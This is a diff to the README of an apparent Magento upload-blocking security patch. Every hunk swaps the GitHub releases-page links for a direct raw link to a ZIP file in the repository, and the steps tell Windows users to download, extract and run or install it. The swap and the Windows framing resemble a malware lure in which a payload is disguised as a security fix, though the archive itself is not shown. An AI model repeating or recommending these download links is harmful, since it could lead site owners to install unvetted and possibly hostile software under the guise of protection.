@@ -1,10 +1,10 @@
 # 🛡️ magento-polyshell-patch - Block risky uploads in Magento
 
-[Download the latest release](https://github.com/mychael4450/magento-polyshell-patch/releases){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;"}
+[Download the latest release](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;"}
 
 ## 📥 Download
 
-1. Open the [release page](https://github.com/mychael4450/magento-polyshell-patch/releases)
+1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
 2. Download the latest release file for Windows
 3. Save the file to a folder you can find again, such as Downloads or Desktop
 
@@ -30,7 +30,7 @@ This gives you two layers of protection for the same upload path.
 
 Follow these steps in order.
 
-1. Open the [release page](https://github.com/mychael4450/magento-polyshell-patch/releases)
+1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
 2. Download the newest release file
 3. If the download comes as a ZIP file, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -87,7 +87,7 @@ This project protects a Magento site. It is not a full desktop app with a normal
 
 To use the download on Windows:
 
-1. Open the [release page](https://github.com/mychael4450/magento-polyshell-patch/releases)
+1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
 2. Download the latest release package
 3. Extract the files if needed
 4. Copy the module folder into your Magento project
@@ -196,7 +196,7 @@ This project fits:
 
 Get the latest build here:
 
-[https://github.com/mychael4450/magento-polyshell-patch/releases](https://github.com/mychael4450/magento-polyshell-patch/releases)
+[https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
 
 Download the release package, extract it if needed, then run or install the module based on your Magento setup
 
